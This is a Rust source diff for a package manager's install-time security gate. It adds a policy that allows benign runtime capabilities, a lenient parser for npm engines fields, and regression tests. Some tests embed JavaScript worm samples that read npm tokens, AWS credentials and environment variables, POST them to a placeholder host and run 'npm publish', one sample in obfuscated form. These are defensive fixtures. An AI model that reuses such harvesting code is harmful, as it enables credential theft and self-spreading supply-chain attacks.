@@ -3355,6 +3355,23 @@ fn link_package_inner(
         &resolved.name,
         &resolved.version,
     )?;
+    // Installing a package runs NONE of its source: OMC never executes
+    // install/postinstall scripts and never imports the package. So the
+    // network/env/file-read/dns/time/random a library uses *when your app later
+    // calls it* are not install-time risks and shouldn't block the install — a
+    // legitimate `omc add stripe` should not have to "grant" stripe's runtime
+    // API surface. We auto-accept those BENIGN runtime capabilities at the
+    // install gate (they remain recorded on the artifact, informational).
+    //
+    // The genuinely install-/malware-relevant behaviours stay deny-by-default
+    // and still block: process spawn (which also represents npm lifecycle
+    // scripts — the Shai-Hulud vector), dynamic eval / unresolved obfuscation,
+    // file WRITES (persistence/backdoor), reads of SENSITIVE files (denied even
+    // under a wildcard grant by the sensitive-read guard), and every
+    // secret-source -> sink data FLOW (the exfiltration shape — which is also
+    // why a package that *combines* a secret read with a network sink still
+    // needs an explicit flow grant).
+    let policy = allow_benign_runtime_capabilities(policy);
     let verification = verify_module(&module, &policy);
     let verifier_findings = verification
         .err()
@@ -3628,6 +3645,29 @@ pub fn effective_package_policy(
     Ok(merge_dsl_policy(base, &dsl))
 }
 
+/// Auto-accept a package's BENIGN runtime capabilities at the install gate.
+///
+/// Installing runs none of the package's source, so the capabilities a library
+/// uses only when later called — network, DNS, env reads, file reads, the clock,
+/// randomness — are not install-time risks. We grant them here so they don't
+/// block the install (they remain recorded on the artifact as the runtime
+/// profile). We deliberately do NOT grant: `ProcSpawn` (also represents npm
+/// lifecycle scripts), `DynamicEval` (eval / unresolved obfuscation), or
+/// `FsWrite` (persistence/backdoor) — those stay deny-by-default. Reads of
+/// SENSITIVE files remain denied even though `FsRead("*")` is granted, because
+/// the sensitive-read guard ignores wildcard grants. Data FLOWS are unaffected
+/// (no flow is granted here), so a package that combines a secret read with a
+/// sink still needs an explicit flow grant.
+fn allow_benign_runtime_capabilities(policy: Policy) -> Policy {
+    policy
+        .allow_capability(Capability::EnvRead("*".to_owned()))
+        .allow_capability(Capability::FsRead("*".to_owned()))
+        .allow_capability(Capability::HttpHost("*".to_owned()))
+        .allow_capability(Capability::DnsHost("*".to_owned()))
+        .allow_capability(Capability::TimeNow)
+        .allow_capability(Capability::RandomBytes)
+}
+
 /// Resolve the global OMC home directory: `$OMC_HOME` when set (it points at the
 /// directory holding the global config — handy for tests/CI), otherwise
 /// `$HOME/.omc` (or `%USERPROFILE%\.omc` on Windows).
@@ -3641,16 +3681,27 @@ fn global_omc_home() -> Option<PathBuf> {
     Some(PathBuf::from(home).join(".omc"))
 }
 
-/// Load the optional global user manifest at `~/.omc/omc.toml`. Returns
+/// The global `~/.omc/omc.toml` is a policy-only baseline: unlike a project
+/// manifest it has no `[project]` (no name/version) and lists no dependencies —
+/// it exists purely to set an org-wide `[policy]` floor. It therefore parses into
+/// this lenient struct rather than the full [`OmcManifest`]. Unknown tables (e.g.
+/// a `[project]` left over from copying a project file) are ignored.
+#[derive(Debug, Clone, Default, Deserialize)]
+struct GlobalConfig {
+    #[serde(default)]
+    policy: ManifestPolicy,
+}
+
+/// Load the optional global user policy at `~/.omc/omc.toml`. Returns
 /// `Ok(None)` when absent; a present-but-malformed file is a hard error.
-fn load_global_manifest() -> Result<Option<OmcManifest>> {
+fn load_global_manifest() -> Result<Option<GlobalConfig>> {
     let Some(path) = global_omc_home().map(|home| home.join("omc.toml")) else {
         return Ok(None);
     };
     if !path.exists() {
         return Ok(None);
     }
-    Ok(Some(read_manifest(path)?))
+    Ok(Some(toml::from_str(&fs::read_to_string(path)?)?))
 }
 
 /// Parse a `min-release-age` duration string into seconds. A present-but-invalid
@@ -19597,7 +19648,7 @@ struct NpmVersion {
     cpu: Option<NpmStringList>,
     #[serde(default)]
     libc: Option<NpmStringList>,
-    #[serde(default)]
+    #[serde(default, deserialize_with = "deserialize_lenient_engines")]
     engines: Option<BTreeMap<String, String>>,
     #[serde(default)]
     scripts: Option<BTreeMap<String, String>>,
@@ -19637,7 +19688,7 @@ struct NpmPackageManifest {
     cpu: Option<NpmStringList>,
     #[serde(default)]
     libc: Option<NpmStringList>,
-    #[serde(default)]
+    #[serde(default, deserialize_with = "deserialize_lenient_engines")]
     engines: Option<BTreeMap<String, String>>,
     #[serde(default)]
     scripts: Option<BTreeMap<String, String>>,
@@ -19684,6 +19735,39 @@ impl NpmStringList {
 struct NpmPeerDependencyMeta {
     #[serde(default)]
     optional: bool,
+}
+
+/// Leniently parse an npm `engines` field. The modern form is an object
+/// (`{"node": ">=18"}`), but ancient package versions on the registry use an
+/// array (`["node", "rhino"]`, e.g. early lodash) or a bare string
+/// (`">=0.10.40"`, e.g. early qs). A single legacy version with one of those
+/// shapes must NOT fail deserialization of the whole packument — that would make
+/// the package (every version of it) uninstallable. We keep the object form and
+/// treat the legacy array/string/bool/null forms as "no engine constraint".
+fn deserialize_lenient_engines<'de, D>(
+    deserializer: D,
+) -> std::result::Result<Option<BTreeMap<String, String>>, D::Error>
+where
+    D: serde::Deserializer<'de>,
+{
+    let value = <serde_json::Value as serde::Deserialize>::deserialize(deserializer)?;
+    Ok(match value {
+        serde_json::Value::Object(map) => {
+            let engines = map
+                .into_iter()
+                .map(|(key, val)| {
+                    let rendered = match val {
+                        serde_json::Value::String(s) => s,
+                        other => other.to_string(),
+                    };
+                    (key, rendered)
+                })
+                .collect();
+            Some(engines)
+        }
+        // Legacy array/string/bool, or explicit null: no usable constraint.
+        _ => None,
+    })
 }
 
 #[derive(Debug, Deserialize)]
@@ -22485,6 +22569,210 @@ packages:
             archive.into_inner().unwrap().finish().unwrap();
         }
         bytes
+    }
+
+    // Verify a package archive through the SAME gate `omc add` uses: profile the
+    // tarball, reconstruct the module, and verify it under the MOST PERMISSIVE
+    // install posture (public defaults + the benign-runtime-cap demotion from
+    // Part 2). If it still blocks here, it blocks for every real project.
+    fn install_verdict_for_worm(
+        package: &ResolvedPackage,
+        bytes: &[u8],
+    ) -> (Verdict, ArchiveProfile) {
+        let profile = profile_archive(package, bytes).unwrap();
+        let module = module_from_profile(package, &profile.capabilities);
+        let policy = allow_benign_runtime_capabilities(
+            default_public_capabilities()
+                .into_iter()
+                .fold(Policy::pure(), Policy::allow_capability),
+        );
+        let verdict = if verify_module(&module, &policy).is_ok() {
+            Verdict::Accepted
+        } else {
+            Verdict::Blocked
+        };
+        (verdict, profile)
+    }
+
+    fn worm_resolved_package(name: &str) -> ResolvedPackage {
+        let mut npm_scripts = BTreeMap::new();
+        // The Shai-Hulud vector: a postinstall hook that runs the harvester the
+        // moment the package lands — code OMC never executes.
+        npm_scripts.insert("postinstall".to_owned(), "node harvest.js".to_owned());
+        ResolvedPackage {
+            ecosystem: Ecosystem::Npm,
+            name: name.to_owned(),
+            version: "1.0.0".to_owned(),
+            source_url: format!("https://example.invalid/{name}.tgz"),
+            download_url: None,
+            local_path: None,
+            filename: format!("{name}-1.0.0.tgz"),
+            expected_sha256: None,
+            expected_sha1: None,
+            expected_integrity: None,
+            npm_direct_tarball: false,
+            pypi_direct_wheel: false,
+            npm_scripts,
+            platform_compatible: true,
+            dependencies: Vec::new(),
+        }
+    }
+
+    // REGRESSION: a Shai-Hulud-class npm worm — postinstall harvester that reads
+    // credentials and exfiltrates them to a canary, then "republishes" itself with
+    // a stolen token — must be BLOCKED at install. Uses canary.invalid (no real
+    // host) and fake credential paths; OMC never runs any of this code.
+    #[test]
+    fn shai_hulud_worm_is_blocked_at_install() {
+        // The harvester the postinstall hook would run: grab the npm token + cloud
+        // creds + env, POST them to a webhook, then republish via the stolen token.
+        let harvester = "const fs = require('fs');\n\
+             const cp = require('child_process');\n\
+             const token = fs.readFileSync('/home/runner/.npmrc', 'utf8');\n\
+             const aws = fs.readFileSync('/home/runner/.aws/credentials', 'utf8');\n\
+             const env = JSON.stringify(process.env);\n\
+             fetch('https://canary.invalid/collect', { method: 'POST', body: token + aws + env });\n\
+             cp.execSync('npm publish --access public');\n";
+        let bytes = npm_tgz_with_files(
+            r#"{"name":"shai-hulud","version":"1.0.0","scripts":{"postinstall":"node harvest.js"}}"#,
+            &[("harvest.js", harvester)],
+        );
+        let package = worm_resolved_package("shai-hulud");
+
+        let (verdict, profile) = install_verdict_for_worm(&package, &bytes);
+        assert_eq!(
+            verdict,
+            Verdict::Blocked,
+            "a Shai-Hulud-class postinstall credential worm must be blocked at install; caps {:?}",
+            profile.capabilities
+        );
+        assert!(
+            profile.capabilities.iter().any(|c| c.kind
+                == CapabilityKind::ProcSpawn
+                && c.target.starts_with("npm-script:")),
+            "the postinstall lifecycle hook must surface as a ProcSpawn capability; caps {:?}",
+            profile.capabilities
+        );
+    }
+
+    // REGRESSION: the obfuscated variant — string-built capability roots so static
+    // triggers don't appear literally — must ALSO fail closed (DynamicEval), not
+    // sneak through as Pure/Accepted.
+    #[test]
+    fn obfuscated_shai_hulud_worm_is_blocked_at_install() {
+        let harvester = "const p = process['en'+'v'];\n\
+             const send = globalThis['fet'+'ch'];\n\
+             const run = new Function('return require')()('child_process');\n\
+             send('https://canary.invalid/c', { method: 'POST', body: JSON.stringify(p) });\n\
+             run.execSync('npm publish');\n";
+        let bytes = npm_tgz_with_files(
+            r#"{"name":"shai-hulud-obf","version":"1.0.0"}"#,
+            &[("index.js", harvester)],
+        );
+        // No declared lifecycle script here: the obfuscation itself must be enough
+        // to fail closed, so the worm can't dodge the gate by hiding its trigger.
+        let mut package = worm_resolved_package("shai-hulud-obf");
+        package.npm_scripts = BTreeMap::new();
+
+        let (verdict, profile) = install_verdict_for_worm(&package, &bytes);
+        assert_eq!(
+            verdict,
+            Verdict::Blocked,
+            "an obfuscated credential worm must fail closed at install; caps {:?}",
+            profile.capabilities
+        );
+        assert!(
+            profile
+                .capabilities
+                .iter()
+                .any(|c| c.kind == CapabilityKind::DynamicEval),
+            "opaque capability-root access must emit a DynamicEval capability; caps {:?}",
+            profile.capabilities
+        );
+    }
+
+    // The shipped recommended global config must stay parseable by the REAL
+    // global-config path (which, unlike a project manifest, has no `[project]`)
+    // and keep its documented freshness floor, so examples/omc.global.toml can't
+    // drift from the schema or regress to requiring a project block.
+    #[test]
+    fn shipped_global_config_example_parses() {
+        let raw = include_str!("../../../examples/omc.global.toml");
+        let config: GlobalConfig =
+            toml::from_str(raw).expect("policy-only global config must parse without [project]");
+        assert_eq!(
+            config.policy.min_release_age.as_deref(),
+            Some("14d"),
+            "the recommended global config must keep its 14d freshness floor"
+        );
+        assert_eq!(
+            parse_min_release_age(config.policy.min_release_age.as_deref()).unwrap(),
+            Some(14 * 24 * 60 * 60),
+            "the documented floor must compile to 14 days of seconds"
+        );
+    }
+
+    // End-to-end: dropping the shipped example at $OMC_HOME/omc.toml must load as a
+    // global baseline (no `[project]` required) and surface its freshness floor.
+    #[test]
+    fn shipped_global_config_loads_from_omc_home() {
+        // `load_global_manifest` reads the process-global $OMC_HOME; serialize the
+        // env mutation so a future env-touching test can't observe a half-set var.
+        static OMC_HOME_TEST_LOCK: std::sync::Mutex<()> = std::sync::Mutex::new(());
+
+        let raw = include_str!("../../../examples/omc.global.toml");
+        let home = tempfile::tempdir().unwrap();
+        fs::write(home.path().join("omc.toml"), raw).unwrap();
+
+        let global = {
+            let _guard = OMC_HOME_TEST_LOCK.lock().unwrap();
+            env::set_var("OMC_HOME", home.path());
+            let loaded = load_global_manifest();
+            env::remove_var("OMC_HOME");
+            loaded
+        }
+        .unwrap()
+        .expect("global config present at $OMC_HOME must load");
+        assert_eq!(global.policy.min_release_age.as_deref(), Some("14d"));
+    }
+
+    // REGRESSION: a packument must still deserialize when ANY version uses a
+    // legacy `engines` shape — an array (early lodash: ["node","rhino"]) or a bare
+    // string (early qs: ">=0.10.40"). Before the lenient parser these failed the
+    // whole `.json::<NpmRoot>()` decode ("error decoding response body"), making
+    // lodash and qs — two of the most-downloaded npm packages — uninstallable.
+    #[test]
+    fn npm_packument_tolerates_legacy_engines_shapes() {
+        let body = r#"{
+            "dist-tags": { "latest": "3.0.0" },
+            "versions": {
+                "0.1.0": {
+                    "version": "0.1.0",
+                    "engines": ["node", "rhino"],
+                    "dist": { "tarball": "https://r/lodash-0.1.0.tgz" }
+                },
+                "5.1.0": {
+                    "version": "5.1.0",
+                    "engines": ">=0.10.40",
+                    "dist": { "tarball": "https://r/qs-5.1.0.tgz" }
+                },
+                "3.0.0": {
+                    "version": "3.0.0",
+                    "engines": { "node": ">=18" },
+                    "dist": { "tarball": "https://r/pkg-3.0.0.tgz" }
+                }
+            }
+        }"#;
+        let root: NpmRoot =
+            serde_json::from_str(body).expect("legacy engines must not fail decode");
+        assert_eq!(root.dist_tags.latest, "3.0.0");
+        // Legacy array/string forms parse as "no constraint"; the object form is kept.
+        assert!(root.versions["0.1.0"].engines.is_none());
+        assert!(root.versions["5.1.0"].engines.is_none());
+        assert_eq!(
+            root.versions["3.0.0"].engines.as_ref().unwrap()["node"],
+            ">=18"
+        );
     }
 
     #[test]
@@ -29888,6 +30176,116 @@ wheels = [
             report.artifact.verdict,
             Verdict::Blocked,
             "plain env->curl exfil must now be Blocked without a covering flow grant"
+        );
+    }
+
+    // Part 2: the install gate demotes BENIGN runtime capabilities (network, env
+    // read, file read, dns, time, random) to informational — installing runs none
+    // of the package's source, so a library's *runtime* API surface must not block
+    // `omc add`. But the install-/malware-relevant behaviours stay deny-by-default,
+    // and every secret-source -> sink FLOW still blocks. This pins both halves so a
+    // future "just allow everything" regression can't slip through.
+    #[test]
+    fn install_gate_demotes_benign_caps_but_keeps_worm_vectors_blocked() {
+        let package = ResolvedPackage {
+            ecosystem: Ecosystem::Npm,
+            name: "demote-fixture".to_owned(),
+            version: "1.0.0".to_owned(),
+            source_url: "https://example.invalid/demote-fixture.tgz".to_owned(),
+            download_url: None,
+            local_path: None,
+            filename: "demote-fixture.tgz".to_owned(),
+            expected_sha256: None,
+            expected_sha1: None,
+            expected_integrity: None,
+            npm_direct_tarball: false,
+            pypi_direct_wheel: false,
+            npm_scripts: BTreeMap::new(),
+            platform_compatible: true,
+            dependencies: Vec::new(),
+        };
+        let env = || CapabilityFinding {
+            kind: CapabilityKind::EnvRead,
+            target: "STRIPE_API_KEY".to_owned(),
+            source: "index.js".to_owned(),
+            evidence: "process.env".to_owned(),
+        };
+        let http = || CapabilityFinding {
+            kind: CapabilityKind::HttpRequest,
+            target: "api.stripe.com".to_owned(),
+            source: "index.js".to_owned(),
+            evidence: "fetch(...)".to_owned(),
+        };
+        let proc = || CapabilityFinding {
+            kind: CapabilityKind::ProcSpawn,
+            target: "npm-script:postinstall".to_owned(),
+            source: "package.json".to_owned(),
+            evidence: "scripts.postinstall".to_owned(),
+        };
+        let eval = || CapabilityFinding {
+            kind: CapabilityKind::DynamicEval,
+            target: "*".to_owned(),
+            source: "index.js".to_owned(),
+            evidence: "eval".to_owned(),
+        };
+        let fs_write = || CapabilityFinding {
+            kind: CapabilityKind::FsWrite,
+            target: "*".to_owned(),
+            source: "index.js".to_owned(),
+            evidence: "fs.writeFileSync".to_owned(),
+        };
+        let sensitive_read = || CapabilityFinding {
+            kind: CapabilityKind::FsRead,
+            target: "/home/victim/.ssh/id_rsa".to_owned(),
+            source: "index.js".to_owned(),
+            evidence: "fs.readFileSync".to_owned(),
+        };
+
+        // The install gate starts from the effective package policy (here just the
+        // public defaults) and then demotes benign runtime caps on top.
+        let base = allow_benign_runtime_capabilities(
+            default_public_capabilities()
+                .into_iter()
+                .fold(Policy::pure(), Policy::allow_capability),
+        );
+        let accepts = |caps: &[CapabilityFinding]| {
+            verify_module(&module_from_profile(&package, caps), &base).is_ok()
+        };
+
+        // ACCEPTED: a lone benign capability is no longer an install-time blocker.
+        assert!(
+            accepts(&[http()]),
+            "a network-only library must install clean (runtime API, not install risk)"
+        );
+        assert!(
+            accepts(&[env()]),
+            "an env-reading library with no sink must install clean"
+        );
+
+        // BLOCKED: install-/malware-relevant behaviours stay deny-by-default.
+        assert!(
+            !accepts(&[proc()]),
+            "process spawn (incl. npm lifecycle scripts — the Shai-Hulud vector) must stay blocked"
+        );
+        assert!(
+            !accepts(&[eval()]),
+            "dynamic eval / unresolved obfuscation must stay blocked"
+        );
+        assert!(
+            !accepts(&[fs_write()]),
+            "file writes (persistence/backdoor) must stay blocked"
+        );
+        assert!(
+            !accepts(&[sensitive_read()]),
+            "sensitive-file reads must stay blocked even under the demoted fs.read:* grant"
+        );
+
+        // BLOCKED: the exfiltration SHAPE (secret read -> network sink) still needs
+        // an explicit flow grant, so a real `stripe` install is gated on the flow,
+        // not on its individual env/network capabilities.
+        assert!(
+            !accepts(&[env(), http()]),
+            "env -> network exfil flow must stay blocked even though both caps are benign"
         );
     }
 
